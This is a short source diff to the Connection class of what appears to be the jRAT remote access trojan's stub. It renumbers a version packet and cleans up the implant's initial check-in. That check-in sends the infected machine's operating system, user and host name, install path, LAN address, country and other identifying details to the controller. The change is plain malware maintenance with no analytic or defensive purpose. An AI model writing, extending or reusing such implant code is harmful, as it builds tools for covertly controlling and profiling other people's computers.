@@ -35,7 +35,7 @@ import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
-import se.jrat.stub.packets.outgoing.Packet30InitVersion;
+import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
 import se.jrat.stub.packets.outgoing.Packet47InitCountry;
@@ -148,10 +148,8 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet1InitHandshake());
 		
 		addToSendQueue(new Packet4InitOperatingSystem());
-		addToSendQueue(new Packet5InitUserHost());
-
-		
-		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
+		addToSendQueue(new Packet5InitUserHost());	
+		addToSendQueue(new Packet6InitVersion());
 
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
